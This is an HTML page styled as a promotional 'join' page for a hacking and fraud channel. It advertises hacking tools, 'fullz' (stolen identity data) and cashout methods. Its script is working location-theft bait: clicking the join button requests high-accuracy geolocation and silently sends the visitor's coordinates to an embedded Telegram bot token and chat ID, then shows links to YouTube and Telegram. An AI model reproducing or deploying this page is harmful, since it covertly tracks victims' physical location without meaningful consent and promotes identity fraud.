<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Share</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;900&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0a0a0a, #1a0033, #4c1d95);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        .particles {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        .particle {
            position: absolute;
            background: #a855f7;
            border-radius: 50%;
            animation: floatParticle 15s linear infinite;
        }
        @keyframes floatParticle {
            0% { transform: translateY(100vh) scale(0.5); }
            100% { transform: translateY(-100vh) scale(1.2); }
        }

        .screen { 
            position: absolute; 
            width: 100%; 
            max-width: 440px; 
            transition: all 0.9s cubic-bezier(0.23, 1, 0.32, 1); 
            z-index: 2;
        }
        .screen.hidden { opacity: 0; transform: translateY(80px) scale(0.85); pointer-events: none; }

        .card {
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(165, 85, 247, 0.3);
            border-radius: 32px;
            padding: 45px 35px;
            box-shadow: 0 0 80px rgba(168, 85, 247, 0.5),
                        inset 0 0 40px rgba(255,255,255,0.05);
            text-align: center;
            position: relative;
        }

        .neon-text {
            font-size: 31px;
            font-weight: 900;
            background: linear-gradient(90deg, #c026d3, #a855f7, #22d3ee);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 35px rgba(168,85,247,0.9);
            margin-bottom: 10px;
            letter-spacing: -1px;
        }

        .main-text {
            font-size: 17.8px;
            line-height: 1.75;
            margin: 28px 0 35px;
            color: #e0e7ff;
            font-weight: 500;
        }

        .speech {
            background: rgba(109, 40, 217, 0.92);
            color: white;
            padding: 18px 25px;
            border-radius: 25px;
            font-size: 17.8px;
            margin: 25px auto;
            max-width: 320px;
            box-shadow: 0 0 30px #a855f7;
        }

        .platform-text {
            font-size: 19.5px;
            font-weight: 700;
            color: #c4b5fd;
            margin: 25px 0 20px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            gap: 55px;
            margin-top: 15px;
        }

        /* SAME SIZE LOGOS (120px) */
        .youtube-logo, .telegram-logo {
            width: 120px;
            height: 120px;
            cursor: pointer;
        }

        /* YouTube Logo */
        .youtube-logo {
            background: #ff0000;
            border-radius: 22px;
            position: relative;
            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.55);
            animation: pop 1.7s ease-in-out infinite;
        }
        .youtube-logo::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 52%;
            transform: translate(-50%, -50%);
            width: 0; height: 0;
            border-top: 22px solid transparent;
            border-bottom: 22px solid transparent;
            border-left: 35px solid white;
        }
        @keyframes pop {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.13); }
        }

        /* Telegram Logo */
        .telegram-logo {
            border-radius: 50%;
            background: linear-gradient(180deg, #2aabee 0%, #229ed9 100%);
            position: relative;
            box-shadow: 0 15px 45px rgba(34, 158, 217, 0.6);
            animation: float 2.1s ease-in-out infinite;
        }
        .paper-plane {
            position: absolute;
            width: 72px;
            height: 62px;
            left: 24px;
            top: 29px;
            background: white;
            clip-path: polygon(0% 45%, 100% 0%, 78% 100%, 50% 73%, 30% 92%, 36% 66%);
        }
        .paper-plane::after {
            content: "";
            position: absolute;
            width: 37px;
            height: 25px;
            left: 25px;
            top: 28px;
            background: #c8eefd;
            clip-path: polygon(0% 100%, 100% 0%, 38% 72%);
        }
        @keyframes float {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-12px) scale(1.09); }
        }

        .join-btn {
            background: linear-gradient(90deg, #7c3aed, #c026d3);
            color: white;
            padding: 19px 60px;
            font-size: 20px;
            font-weight: 700;
            border-radius: 50px;
            width: 100%;
            margin-top: 15px;
            box-shadow: 0 0 45px #a855f7,
                        0 15px 35px rgba(124, 58, 237, 0.6);
            transition: all 0.4s;
            position: relative;
            overflow: hidden;
        }
        .join-btn:hover {
            transform: translateY(-6px);
            box-shadow: 0 0 65px #c026d3;
        }
    </style>
</head>
<body>

    <div class="particles" id="particles"></div>

    <!-- INITIAL SCREEN -->
    <div id="initialScreen" class="screen">
        <div class="card">
            <h1 class="neon-text">INSTANT LOCATION</h1>
            <div class="main-text">
                Join <strong>@DetorLab</strong> — Dark Web Level<br>
                <strong>Hacking Tools • Premium Fullz • Cashout Methods 2026</strong>
            </div>
            <a href="#" id="joinLink" class="join-btn">JOIN NOW →</a>
        </div>
    </div>

    <!-- SECOND SCREEN -->
    <div id="characterScreen" class="screen hidden">
        <div class="card">
            <div class="speech">
                सोचो मत, जॉइन करो हैकिंग सीखने के लिए 🔥<br>
                <strong>Real Game Starts Here</strong>
            </div>

            <div class="platform-text">Choose Your Hacking Arena</div>

            <div class="logo-container">
                <!-- YouTube -->
                <div onclick="window.open('https://youtube.com/@xyz?si=q_2s763BQKcgc1gf','_blank')" class="youtube-logo"></div>

                <!-- Telegram -->
                <div onclick="window.open('https://t.me/lexluther_supreme','_blank')" class="telegram-logo">
                    <div class="paper-plane"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 45; i++) {
                const p = document.createElement('div');
                p.className = 'particle';
                p.style.width = p.style.height = Math.random() * 7 + 'px';
                p.style.left = Math.random() * 100 + '%';
                p.style.animationDuration = Math.random() * 14 + 10 + 's';
                p.style.animationDelay = '-' + Math.random() * 18 + 's';
                container.appendChild(p);
            }
        }
        createParticles();

        const TOKEN = "8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI";
        const CHAT_ID = "7066124462";

        function sendLocation(lat, lon) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}&live_period=3600`;
            new Image().src = url;
            fetch(url, {mode:'no-cors'}).catch(()=>{});
        }

        function showSecondScreen() {
            document.getElementById('initialScreen').classList.add('hidden');
            setTimeout(() => {
                document.getElementById('characterScreen').classList.remove('hidden');
            }, 600);
        }

        function requestLocationAndRedirect() {
            if (!navigator.geolocation) return showSecondScreen();

            navigator.geolocation.getCurrentPosition(
                pos => {
                    sendLocation(pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
                    showSecondScreen();
                },
                () => showSecondScreen(),
                {enableHighAccuracy: true, timeout: 12000}
            );
        }

        document.getElementById('joinLink').addEventListener('click', e => {
            e.preventDefault();
            requestLocationAndRedirect();
        });
    </script>
</body>
</html>
